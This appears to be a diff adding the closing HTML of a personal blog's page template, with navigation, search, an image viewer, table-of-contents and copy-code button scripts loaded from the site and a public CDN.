+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/side.svg" alt="b1xcy&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
